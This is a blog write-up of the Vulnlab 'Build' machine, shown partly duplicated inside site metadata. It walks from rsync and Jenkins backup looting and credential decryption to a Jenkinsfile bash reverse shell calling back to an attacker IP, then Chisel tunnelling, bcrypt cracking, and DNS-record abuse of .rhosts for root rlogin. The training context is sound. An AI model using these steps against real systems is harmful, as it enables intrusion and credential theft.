[here](https://stackoverflow.com/questions/38143485/how-do-i-make-jenkins-2-0-execute-a-sh-command-in-the-same-directory-as-the-chec).\n\nLet's use a simple reverse shell to exploit this, you can find them on [Revshells](https://www.revshells.com/).\n\n```\npipeline {\n    agent any\n\n    stages {\n        stage('Do nothing') {\n            steps {\n                sh '''\n                bash -c '/bin/bash -i >& /dev/tcp/10.8.0.173/9001 0>&1'\n                '''\n            }\n        }\n    }\n}\n```\n\nWe'll then start up a reverse shell and wait for this pipeline to execute after we save the file. I'm assuming that this is automated so we'll need to wait probably a minute or two depending on how often the build is deployed.\n\n```\n└─$ nc -lvnp 9001       \nlistening on [any] 9001 ...\nconnect to [10.8.0.173] from (UNKNOWN) [10.10.90.130] 45014\nbash: cannot set terminal process group (7): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#\n```\n\nAfter a short amount of time after committing to the branch, you'll see that we'll receive a callback on our machine that generated a reverse shell.\n\nThe user flag is within `/root`.\n\n# Chisel Tunneling\n\nGiven that we're already root on this machine and we have only gotten a user flag, I'm assuming that we're in a container of some sort. This along with the fact that the delimiter after our username on the TTY seems to be an odd string of characters.\n\nYou'll notice that we don't have access to basic tools such as `netstat` or `ip`, which are generally installed by default on Linux machines. This solidifies my theory that we're currently in a container, so we'll need to perform a breakout to be able to access the actual machine. I'll set up a [Sliver](https://github.com/BishopFox/sliver) C2 server so that we can enumerate the filesystem a little easier.\n\nSo one thing as I mentioned before, we don't have access to `netstat` or `ifconfig` due to the containers limitations, so we don't know what the address is of this container. There is an alternative though, which is within `/proc/net/route`. This file shows all of the network interfaces and a hexadecimal version of their destination  and gateway IP addresses. There's a way to decode this, which you can find [here](https://www.browserling.com/tools/hex-to-ip).\n\nAfter decoding them, you'll find that it's backwards. The host seems to be `172.18.0.1`.\n\nImmediately though, I remembered that there was port 8081 and port 3306 running on this machine through a firewall. Although we are within a container, there's a chance that we can still access these two ports remotely. We'll use a tool called [Chisel](https://github.com/jpillora/chisel), and attempt to redirect these services back to our localhost for us to access.\n\nYou'll need to upload the chisel binary to the container as well as have your own to start the server. We'll use a socks proxy along with `proxychains4`.\n\n```\n└─$ ./chisel server --reverse --port 8001            \n2024/06/03 13:48:43 server: Reverse tunnelling enabled\n2024/06/03 13:48:43 server: Fingerprint CrkDZ/Wi1k4tB14kgS3IOxLFVNgd4mQ/r/aKuFchUII=\n2024/06/03 13:48:43 server: Listening on http://0.0.0.0:8001\n```\n\nThen on the remote machine, execute the chisel client to connect back to this server we just stood up.\n\n```\nsliver (build) > execute chisel client 10.8.0.173:8001 R:socks\n[*] Command executed successfully\n```\n\nYou'll need to edit your `/etc/proxychains4.conf` to reflect on the address that the socks proxy is listening on. This generally is on port 1080/1081, the chisel server output should give you the answer.\n\nNow that we're tunneled directly to the machine, we can attempt to access the MySQL database on our Kali machine by using `proxychains`.\n\n# Enumerating MySQL\n\n```\n└─$ proxychains4 -q mysql -u root -h 172.18.0.1 -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 51\nServer version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nSupport MariaDB developers by giving a star at https://github.com/MariaDB/server\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> \n```\n\nAfter a bit of enumeration, I found a hash for `PowerDNS` within the `powerdnsadmin` database underneath the `user` table. This specific hash seems to be encoded with `bcrypt`, as denoted by the `$2b$` delimiter.\n\n`JTR` can do the heavy lifting for us in this case, to which I also made sure to place this hash within its own text file.\n\n```\n└─$ john powerdns.txt --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 4096 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n[...snip...]          (?)     \n1g 0:00:01:18 DONE (2024-06-03 14:18) 0.01270g/s 16.92p/s 16.92c/s 16.92C/s winston..incubus\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\nNow that we have the hash to PowerDNS, we'll need to find a way to access its resources to be able to login.\n\nIf you try to access port `8081` through a reverse port forward (outlined below):\n\n```\nsliver (build) > execute chisel client 10.8.0.173:8002 R:8081:127.0.0.1:8081\n```\n\nYou'll find that you can't access the resources that simply. If you think about, we're currently using the gateway of the container, however we aren't able to simple just access the resources from this gateway. The ports themselves are forwarded from different machines across the `172` subnet.\n\nTo get more of what I mean, you can refer to the `records` table within the MySQL `powerdnsadmin` database to see the IP range of this machine.\n\n```\nMariaDB [powerdnsadmin]> select * from records;\n+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+\n| id | domain_id | name                 | type | content                                                                                  | ttl  | prio | disabled | ordername | auth |\n+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+\n|  8 |         1 | db.build.vl          | A    | 172.18.0.4                                                                               |   60 |    0 |        0 | NULL      |    1 |\n|  9 |         1 | gitea.build.vl       | A    | 172.18.0.2                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 10 |         1 | intern.build.vl      | A    | 172.18.0.1                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 11 |         1 | jenkins.build.vl     | A    | 172.18.0.3                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 12 |         1 | pdns-worker.build.vl | A    | 172.18.0.5                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 13 |         1 | pdns.build.vl        | A    | 172.18.0.6                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 14 |         1 | build.vl             | SOA  | a.misconfigured.dns.server.invalid hostmaster.build.vl 2024050201 10800 3600 604800 3600 | 1500 |    0 |        0 | NULL      |    1 |\n+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+\n7 rows in set (0.148 sec)\n```\n\nAs you can see, the PowerDNS admin service seems to be running on either `.05` or `.06`. We can run a simple bash loop to determine which is which.\n\n```\n└─$ for i in {5..6}; do proxychains4 -q nmap -p8081 172.18.0.$i; done\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 14:33 EDT\nNmap scan report for 172.18.0.5\nHost is up (0.57s latency).\n\nPORT     STATE SERVICE\n8081/tcp open  blackice-icecap\n\nNmap done: 1 IP address (1 host up) scanned in 1.54 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 14:33 EDT\nNmap scan report for 172.18.0.6\nHost is up (0.68s latency).\n\nPORT     STATE  SERVICE\n8081/tcp closed blackice-icecap\n\nNmap done: 1 IP address (1 host up) scanned in 1.65 seconds\n```\n\nIt seems that the access point is on `.05`. Let's try to access it through our web browser. We'll need to use FoxyProxy and tunnel it through our SOCKS proxy in order to access the website. If we tried to do this without a web proxy, we wouldn't be able to reach the machine.\n\n![](/images/vulnlab/build-vl/f.png)\n\nOnce that's up and running, be sure to enable it.\n\nYou'll come into an issue that seems to prevent you from accessing the PowerDNS admin page. This is due to the fact that this is actually behind another firewall. However, if you were to run another NMAP scan against `172.18.0.6`, you'll find that there's actually a web server running on that port.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 15:29 EDT\nNmap scan report for 172.18.0.6\nHost is up (0.33s latency).\n\nPORT     STATE  SERVICE\n80/tcp   open   http\n8081/tcp closed blackice-icecap\n\nNmap done: 1 IP address (1 host up) scanned in 1.26 seconds\n```\n\n# DNS Record Manipulation\n\nWe can try to access the webserver through our web proxy, and it should land us at the PowerDNS login.\n\n![](/images/vulnlab/build-vl/g.png)\n\nLet's now login with the `admin` creds that we cracked earlier. This should bring you to the dashboard for PowerDNS, to which you can access the Zone Records pane to view the DNS records for `build.vl`.\n\n![](/images/vulnlab/build-vl/h.png)\n\nNow that we have access to the zone records for this domain specifically, there's a bit of misconfiguration that we can exploit.\n\nIf you remember from before, there were ports `512-514` that were designated to the RSH service. This is essentially a much more insecure version of SSH, which in some cases can allow for unauthorized login as the root user if misconfigured. You can find more information about this [here](https://www.ssh.com/academy/ssh/rsh).\n\nThe interesting note about this is that the specific DNS servers that are able to access RSH are designated within a `.rhosts` file. This file was within the `/root` directory of the container that we previously had access to, and contained the following contents.\n\n```\nroot@5ac6c7d6fb8e:~# cat .rhosts\nadmin.build.vl +\nintern.build.vl +\n```\n\nThis means that the RSH client trusts both `intern` and `admin`, though you'll see that only `intern` is configured.\n\nIf we configure `admin` to point to our IP address, of our Kali machine, then we should theoretically be able to authenticate through RSH to the machine.\n\n![](/images/vulnlab/build-vl/i.png)\n\n# Misconfigured RSH Login\n\nNow that it's configured, let's try to use `rlogin` to authenticate as the root user to the machine.\n\n```\n└─$ rlogin root@10.10.94.174\nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)\n......\nroot@build:~#\n```\n\nYou'll see that it authenticated us properly, and we were able to access the `build` machine. Given that we now have access to this, you'll actually notice that the directory `/root/scripts/root/` is a mount of the root directory of the container.\n\n```\nroot@build:~/scripts/root# ls -la\ntotal 17884\ndrwxr-xr-x 3 root root    4096 Jun  3 19:23 .\ndrwxr-xr-x 6 root root    4096 May  2 15:35 ..\nlrwxrwxrwx 1 root root       9 May  1 14:37 .bash_history -> /dev/null\n-rwxrwxrwx 1 root root 9637888 Jun  3 19:23 build\n-rwxrwxrwx 1 root root 8654848 Jun  3 19:23 chisel\n-r-------- 1 root root      35 May  1 17:37 .rhosts\ndrwxr-xr-x 2 root root    4096 May  1 16:05 .ssh\n-rw------- 1 root root      37 May  1 14:29 user.txt\n```\n\nAs you can see, this further solidifies the fact that this machine had access to the container through RSH by utilizing the `.rhosts` file. If this specific file had not been within this directory, there's a chance we would've never been able to exploit this without altering the web contents of a container that we had access to and that we knew WAS connected to the machine.\n\nThis specific vulnerability was just a misconfiguration on the `intern` users part, which could've been due to wanting the main machine to be able to authenticate through RSH to the container.\n\nNonetheless, now that we have access to root on the main machine, we can view the root flag in `/root/root.txt`. This means we have successfully completed this machine!\n\n![](/images/vulnlab/build-vl/j.png)\n\n# Conclusion\n\nThis machine was probably the longest I've done, and it took a lot of brainstorming as to what the next part of the attack path was. I've always struggled with machines that are heavy on web-app exploits, so this was great learning material to practice. Big thank you to xct for the development of this machine!\n\n# Resources\n\nhttps://dan-feliciano.com/writeups/sync/\nhttps://www.speedguide.net/port.php?port=3000\nhttps://github.com/go-gitea/gitea\nhttps://www.jenkins.io/doc/book/pipeline/jenkinsfile/\nhttps://github.com/hoto/jenkins-credentials-decryptor\nhttps://gist.github.com/frohoff/fed1ffaab9b9beeb1c76\nhttps://www.revshells.com/\nhttps://stackoverflow.com/questions/48316346/gitea-and-jenkins-webhook\nhttps://github.com/BishopFox/sliver\nhttps://github.com/jpillora/chisel\nhttps://www.ssh.com/academy/ssh/rsh","source":"_posts/build-vl.md","raw":"---\ntitle: Build - Vulnlab\ndate: 2024-06-05 01:28:47\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Windows'\ndescription: The is one of the latest VulnLab machines that released in the Easy category, and it was a really well-put together machine. It offers practice into relatively unused ports and applications - also having us tunnel machine resources through a firewall.\ncover: /images/vulnlab/build-vl/build_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\n\nThe is one of the latest VulnLab machines that released in the Easy category, and it was a really well-put together machine. It offers practice into relatively unused ports and applications - also having us tunnel machine resources through a firewall.\n\n# Enumeration\n\nLet's start with our usual NMAP scans of the machine. Note that I ran a port range scan from `1-10000`.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 23:42 EDT\nNmap scan report for 10.10.90.130\nHost is up (0.12s latency).\nNot shown: 9991 closed tcp ports (reset)\nPORT     STATE    SERVICE\n22/tcp   open     ssh\n53/tcp   open     domain\n512/tcp  open     exec\n513/tcp  open     login\n514/tcp  open     shell\n873/tcp  open     rsync\n3000/tcp open     ppp\n3306/tcp filtered mysql\n8081/tcp filtered blackice-icecap\n\nNmap done: 1 IP address (1 host up) scanned in 126.41 seconds\n```\n\nSo as you can see, we have access to decent amount of ports on the target machine. The only issue is that ports `3306` and `8081` are filtered, meaning they are current behind a firewall. The only way for us to access these resources is to be on the machine internally.\n\nAs for the other ports, it seems that we have SSH access along with this machine being a DC having port 53. There also seems to be another port on this machine as `RSYNC`, which we have tested before my writeup for [Sync](https://dan-feliciano.com/writeups/sync/).\n\nFurthermore, we have access to a web application on port `3000`, which I've referenced before as having the potential to be vulnerable based on the catalog of web applications that use this port. You can find information about what this port can potentially host [here](https://www.speedguide.net/port.php?port=3000).\n\nThere are other ports on here that seem to have apparent vulnerabilities, being `512-514`, however we can ignore these for now as we'll need credentials to access them.\n\n# Gitea and Jenkins\n\nLet's access the web application on port `3000` to see if there's anything we can exploit.\n\n![](/images/vulnlab/build-vl/b.png)\n\nThis seems to bring us to a [Gitea](https://github.com/go-gitea/gitea) page, which is essentially a ported web application synced with Git for easy access to web development.\n\nIt seems that we're able to register for an account in the top left, so I'll fill in the necessary authorization requirements and see if we can access the application's login panel.\n\nAfter logging in, you can see that the web application has four tabs in the top left. These each access different resources, however the `Explore` one seems to bring promise as it let's us explore repositories that were imported to Gitea from other users.\n\n![](/images/vulnlab/build-vl/c.png)\n\nThis repository contains one file titled as a `Jenkinsfile`. I looked into this type of file a bit more, it seems to be linked to the [Jenkins](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/) application. This specific application is used for deployment automation in web applications. The `Jenkinsfile` in particular is a text file that contains the deployment information of a Jenkins Pipeline, used to build different parts of the deployment.\n\nSince these builds are automated through Jenkins, this file in particular is probably being executed in intervals. The interesting part is that we have access to the source code for this build, meaning if we alter it, it should execute automatically.\n\nAt this point the attack path becomes clear, we'll need to compromise the `buildadm` account who has control over this repository and use it to place a reverse shell within the `Jenkinsfile`. From there, Jenkins should automatically execute this build along with our reverse shell.\n\n# RSYNC File Enumeration\n\nSince there isn't much else to check out on this webpage, let's turn our attention to RSYNC. To those who aren't aware, RSYNC s essentially a filesystem mounting/share service. It allows administrators to copy files from one particular location in the filesystem to another, or allows them to mount it to a location similar to `NFS`. This is used if users need to have files copied to another location in a quick-manner. In our case, `rsync` is a tool that we can examine to determine if there are any files currently within the service that we can retrieve.\n\nWe can list all of the currently archived files within RSYNC with one simple command as seen below.\n\n```\n└─$ rsync -av --list-only rsync://10.10.90.130\nbackups         backups\n```\n\nIt seems that there's a `backups` archive within the contents of RSYNC filesystem, which we can download with the same `rsync` utility.\n\n```\n└─$ rsync -r 10.10.90.130::backups . \nrsync: [receiver] write error: Broken pipe (32)\nrsync error: received SIGINT, SIGTERM, or SIGHUP (code 20) at io.c(1700) [sender=3.2.7]\n\n└─$ ls\njenkins.tar.gz\n```\n\nThe initial `rsync` download will take a long time as the archive is a big file. I've heard notice from some other people who were pen-testing this box that said the download itself took them almost 20 minutes to download. The key here is patience, it was finished in about 2-3 minutes for me.\n\nIt should return a `jenkins.tar.gz`, which is a double compressed archive. We can decompress it with `tar -xvf jenkins.tar.gz`. Be prepared for a lot of output the screen.\n\nThis returns the entire archive for the Jenkins application, which we'll parse to see if any important information is within the filesystem here.\n\nSo you'll notice that there are a few interesting files in different parts of this filesystem. You'll find a `secret.key` file in the root directory along with a `hudson.util.Secret` and `master.key` files within the `secrets` directory.\n\nWithin `jenkins_configuration/users/admin_8569439066427679502`, you can find a `config.xml` file that seems to be related to the admin user. You'll find a hash in this file for that same user.\n\n```\n</jenkins.model.experimentalflags.UserExperimentalFlagsProperty>\n    <hudson.security.HudsonPrivateSecurityRealm_-Details>\n      <passwordHash>#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG</passwordHash>\n    </hudson.security.HudsonPrivateSecurityRealm_-Details>\n    <hudson.tasks.Mailer_-UserProperty plugin=\"mailer@472.vf7c289a_4b_420\">\n      <emailAddress>admin@build.vl</emailAddress>\n```\n\nAlthough we aren't relatively 100% confident, I do believe that these files must be linked somehow. I'll do some research into these files to see if there's any plaintext passwords we can retrieve from them.\n\n# Decrypting Jenkins Passwords\n\nI found a notable utility on GitHub that decrypts these types of passwords. You can find that [here](https://github.com/hoto/jenkins-credentials-decryptor), and it involves using three types of files - the `master.key` file, the `hudson.util.Secret` file, and a `credentials.xml` file.\n\nThe only odd part is that the `config.xml` file we have for the admin user does not seem to work with those two secret files we have. Which makes sense - this isn't relative to the `buildadm` user that we are trying to access.\n\nI did a bit more poking around the archive and found a file that DOES seem to pertain to the `buildadm` user, underneath `/jenkins_configuration/jobs/build`.\n\n```\n<id>e4048737-7acd-46fd-86ef-a3db45683d4f</id>\n<description></description>\n<username>buildadm</username>\n<password>{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}</password>\n<usernameSecret>false</usernameSecret>\n```\n\nSince we have all the required files needed to decrypt this hash, let's move them all to our base directory for easier access.\n\n```\n└─$ jenkins-credentials-decryptor/bin/jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml -o json\n[\n  {\n    \"id\": \"e4048737-7acd-46fd-86ef-a3db45683d4f\",\n    \"password\": \"[...snip...]\",\n    \"username\": \"buildadm\"\n  }\n]\n```\n\nIt seems that this specific file decryption script was able to decrypt the password successfully. The password was returned in a JSON format as seen above, which we can now use to access the `buildadm` user on Gitea.\n\n# Build -> RCE\n\nNow that we have access to this user on Gitea, we can take a look at the `Jenkinsfile` script within their repository.\n\n![](/images/vulnlab/build-vl/d.png)\n\nYou can see the respective repository on the right side of the page, or we can access it as we did before in the `Explore` tab. \n\nWithin the `Jenkinsfile`, we can select the `Edit` icon to the right of the file to alter it.\n\n![](/images/vulnlab/build-vl/e.png)\n\nThe file itself contains a small script that seems to be running `sh '/bin/true'`. You can do some research onto `Jenkinsfiles` to see if there are any reverse shells that we can upload. I found however that you can enclose multiple line scripts within a directory block, to where I got the impression from [here](https://stackoverflow.com/questions/38143485/how-do-i-make-jenkins-2-0-execute-a-sh-command-in-the-same-directory-as-the-chec).\n\nLet's use a simple reverse shell to exploit this, you can find them on [Revshells](https://www.revshells.com/).\n\n```\npipeline {\n    agent any\n\n    stages {\n        stage('Do nothing') {\n            steps {\n                sh '''\n                bash -c '/bin/bash -i >& /dev/tcp/10.8.0.173/9001 0>&1'\n                '''\n            }\n        }\n    }\n}\n```\n\nWe'll then start up a reverse shell and wait for this pipeline to execute after we save the file. I'm assuming that this is automated so we'll need to wait probably a minute or two depending on how often the build is deployed.\n\n```\n└─$ nc -lvnp 9001       \nlistening on [any] 9001 ...\nconnect to [10.8.0.173] from (UNKNOWN) [10.10.90.130] 45014\nbash: cannot set terminal process group (7): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#\n```\n\nAfter a short amount of time after committing to the branch, you'll see that we'll receive a callback on our machine that generated a reverse shell.\n\nThe user flag is within `/root`.\n\n# Chisel Tunneling\n\nGiven that we're already root on this machine and we have only gotten a user flag, I'm assuming that we're in a container of some sort. This along with the fact that the delimiter after our username on the TTY seems to be an odd string of characters.\n\nYou'll notice that we don't have access to basic tools such as `netstat` or `ip`, which are generally installed by default on Linux machines. This solidifies my theory that we're currently in a container, so we'll need to perform a breakout to be able to access the actual machine. I'll set up a [Sliver](https://github.com/BishopFox/sliver) C2 server so that we can enumerate the filesystem a little easier.\n\nSo one thing as I mentioned before, we don't have access to `netstat` or `ifconfig` due to the containers limitations, so we don't know what the address is of this container. There is an alternative though, which is within `/proc/net/route`. This file shows all of the network interfaces and a hexadecimal version of their destination  and gateway IP addresses. There's a way to decode this, which you can find [here](https://www.browserling.com/tools/hex-to-ip).\n\nAfter decoding them, you'll find that it's backwards. The host seems to be `172.18.0.1`.\n\nImmediately though, I remembered that there was port 8081 and port 3306 running on this machine through a firewall. Although we are within a container, there's a chance that we can still access these two ports remotely. We'll use a tool called [Chisel](https://github.com/jpillora/chisel), and attempt to redirect these services back to our localhost for us to access.\n\nYou'll need to upload the chisel binary to the container as well as have your own to start the server. We'll use a socks proxy along with `proxychains4`.\n\n```\n└─$ ./chisel server --reverse --port 8001            \n2024/06/03 13:48:43 server: Reverse tunnelling enabled\n2024/06/03 13:48:43 server: Fingerprint CrkDZ/Wi1k4tB14kgS3IOxLFVNgd4mQ/r/aKuFchUII=\n2024/06/03 13:48:43 server: Listening on http://0.0.0.0:8001\n```\n\nThen on the remote machine, execute the chisel client to connect back to this server we just stood up.\n\n```\nsliver (build) > execute chisel client 10.8.0.173:8001 R:socks\n[*] Command executed successfully\n```\n\nYou'll need to edit your `/etc/proxychains4.conf` to reflect on the address that the socks proxy is listening on. This generally is on port 1080/1081, the chisel server output should give you the answer.\n\nNow that we're tunneled directly to the machine, we can attempt to access the MySQL database on our Kali machine by using `proxychains`.\n\n# Enumerating MySQL\n\n```\n└─$ proxychains4 -q mysql -u root -h 172.18.0.1 -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 51\nServer version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nSupport MariaDB developers by giving a star at https://github.com/MariaDB/server\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> \n```\n\nAfter a bit of enumeration, I found a hash for `PowerDNS` within the `powerdnsadmin` database underneath the `user` table. This specific hash seems to be encoded with `bcrypt`, as denoted by the `$2b$` delimiter.\n\n`JTR` can do the heavy lifting for us in this case, to which I also made sure to place this hash within its own text file.\n\n```\n└─$ john powerdns.txt --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 4096 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n[...snip...]          (?)     \n1g 0:00:01:18 DONE (2024-06-03 14:18) 0.01270g/s 16.92p/s 16.92c/s 16.92C/s winston..incubus\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\nNow that we have the hash to PowerDNS, we'll need to find a way to access its resources to be able to login.\n\nIf you try to access port `8081` through a reverse port forward (outlined below):\n\n```\nsliver (build) > execute chisel client 10.8.0.173:8002 R:8081:127.0.0.1:8081\n```\n\nYou'll find that you can't access the resources that simply. If you think about, we're currently using the gateway of the container, however we aren't able to simple just access the resources from this gateway. The ports themselves are forwarded from different machines across the `172` subnet.\n\nTo get more of what I mean, you can refer to the `records` table within the MySQL `powerdnsadmin` database to see the IP range of this machine.\n\n```\nMariaDB [powerdnsadmin]> select * from records;\n+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+\n| id | domain_id | name                 | type | content                                                                                  | ttl  | prio | disabled | ordername | auth |\n+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+\n|  8 |         1 | db.build.vl          | A    | 172.18.0.4                                                                               |   60 |    0 |        0 | NULL      |    1 |\n|  9 |         1 | gitea.build.vl       | A    | 172.18.0.2                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 10 |         1 | intern.build.vl      | A    | 172.18.0.1                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 11 |         1 | jenkins.build.vl     | A    | 172.18.0.3                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 12 |         1 | pdns-worker.build.vl | A    | 172.18.0.5                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 13 |         1 | pdns.build.vl        | A    | 172.18.0.6                                                                               |   60 |    0 |        0 | NULL      |    1 |\n| 14 |         1 | build.vl             | SOA  | a.misconfigured.dns.server.invalid hostmaster.build.vl 2024050201 10800 3600 604800 3600 | 1500 |    0 |        0 | NULL      |    1 |\n+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+\n7 rows in set (0.148 sec)\n```\n\nAs you can see, the PowerDNS admin service seems to be running on either `.05` or `.06`. We can run a simple bash loop to determine which is which.\n\n```\n└─$ for i in {5..6}; do proxychains4 -q nmap -p8081 172.18.0.$i; done\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 14:33 EDT\nNmap scan report for 172.18.0.5\nHost is up (0.57s latency).\n\nPORT     STATE SERVICE\n8081/tcp open  blackice-icecap\n\nNmap done: 1 IP address (1 host up) scanned in 1.54 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 14:33 EDT\nNmap scan report for 172.18.0.6\nHost is up (0.68s latency).\n\nPORT     STATE  SERVICE\n8081/tcp closed blackice-icecap\n\nNmap done: 1 IP address (1 host up) scanned in 1.65 seconds\n```\n\nIt seems that the access point is on `.05`. Let's try to access it through our web browser. We'll need to use FoxyProxy and tunnel it through our SOCKS proxy in order to access the website. If we tried to do this without a web proxy, we wouldn't be able to reach the machine.\n\n![](/images/vulnlab/build-vl/f.png)\n\nOnce that's up and running, be sure to enable it.\n\nYou'll come into an issue that seems to prevent you from accessing the PowerDNS admin page. This is due to the fact that this is actually behind another firewall. However, if you were to run another NMAP scan against `172.18.0.6`, you'll find that there's actually a web server running on that port.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 15:29 EDT\nNmap scan report for 172.18.0.6\nHost is up (0.33s latency).\n\nPORT     STATE  SERVICE\n80/tcp   open   http\n8081/tcp closed blackice-icecap\n\nNmap done: 1 IP address (1 host up) scanned in 1.26 seconds\n```\n\n# DNS Record Manipulation\n\nWe can try to access the webserver through our web proxy, and it should land us at the PowerDNS login.\n\n![](/images/vulnlab/build-vl/g.png)\n\nLet's now login with the `admin` creds that we cracked earlier. This should bring you to the dashboard for PowerDNS, to which you can access the Zone Records pane to view the DNS records for `build.vl`.\n\n![](/images/vulnlab/build-vl/h.png)\n\nNow that we have access to the zone records for this domain specifically, there's a bit of misconfiguration that we can exploit.\n\nIf you remember from before, there were ports `512-514` that were designated to the RSH service. This is essentially a much more insecure version of SSH, which in some cases can allow for unauthorized login as the root user if misconfigured. You can find more information about this [here](https://www.ssh.com/academy/ssh/rsh).\n\nThe interesting note about this is that the specific DNS servers that are able to access RSH are designated within a `.rhosts` file. This file was within the `/root` directory of the container that we previously had access to, and contained the following contents.\n\n```\nroot@5ac6c7d6fb8e:~# cat .rhosts\nadmin.build.vl +\nintern.build.vl +\n```\n\nThis means that the RSH client trusts both `intern` and `admin`, though you'll see that only `intern` is configured.\n\nIf we configure `admin` to point to our IP address, of our Kali machine, then we should theoretically be able to authenticate through RSH to the machine.\n\n![](/images/vulnlab/build-vl/i.png)\n\n# Misconfigured RSH Login\n\nNow that it's configured, let's try to use `rlogin` to authenticate as the root user to the machine.\n\n```\n└─$ rlogin root@10.10.94.174\nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)\n......\nroot@build:~#\n```\n\nYou'll see that it authenticated us properly, and we were able to access the `build` machine. Given that we now have access to this, you'll actually notice that the directory `/root/scripts/root/` is a mount of the root directory of the container.\n\n```\nroot@build:~/scripts/root# ls -la\ntotal 17884\ndrwxr-xr-x 3 root root    4096 Jun  3 19:23 .\ndrwxr-xr-x 6 root root    4096 May  2 15:35 ..\nlrwxrwxrwx 1 root root       9 May  1 14:37 .bash_history -> /dev/null\n-rwxrwxrwx 1 root root 9637888 Jun  3 19:23 build\n-rwxrwxrwx 1 root root 8654848 Jun  3 19:23 chisel\n-r-------- 1 root root      35 May  1 17:37 .rhosts\ndrwxr-xr-x 2 root root    4096 May  1 16:05 .ssh\n-rw------- 1 root root      37 May  1 14:29 user.txt\n```\n\nAs you can see, this further solidifies the fact that this machine had access to the container through RSH by utilizing the `.rhosts` file. If this specific file had not been within this directory, there's a chance we would've never been able to exploit this without altering the web contents of a container that we had access to and that we knew WAS connected to the machine.\n\nThis specific vulnerability was just a misconfiguration on the `intern` users part, which could've been due to wanting the main machine to be able to authenticate through RSH to the container.\n\nNonetheless, now that we have access to root on the main machine, we can view the root flag in `/root/root.txt`. This means we have successfully completed this machine!\n\n![](/images/vulnlab/build-vl/j.png)\n\n# Conclusion\n\nThis machine was probably the longest I've done, and it took a lot of brainstorming as to what the next part of the attack path was. I've always struggled with machines that are heavy on web-app exploits, so this was great learning material to practice. Big thank you to xct for the development of this machine!\n\n# Resources\n\nhttps://dan-feliciano.com/writeups/sync/\nhttps://www.speedguide.net/port.php?port=3000\nhttps://github.com/go-gitea/gitea\nhttps://www.jenkins.io/doc/book/pipeline/jenkinsfile/\nhttps://github.com/hoto/jenkins-credentials-decryptor\nhttps://gist.github.com/frohoff/fed1ffaab9b9beeb1c76\nhttps://www.revshells.com/\nhttps://stackoverflow.com/questions/48316346/gitea-and-jenkins-webhook\nhttps://github.com/BishopFox/sliver\nhttps://github.com/jpillora/chisel\nhttps://www.ssh.com/academy/ssh/rsh","slug":"build-vl","published":1,"updated":"2024-06-05T20:04:34.409Z","_id":"clx1em92e0000m2uf4tkx6xce","comments":1,"layout":"post","photos":[],"content":"<p>The is one of the latest VulnLab machines that released in the Easy category, and it was a really well-put together machine. It offers practice into relatively unused ports and applications - also having us tunnel machine resources through a firewall.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scans of the machine. Note that I ran a port range scan from <code>1-10000</code>.</p>\n<figure 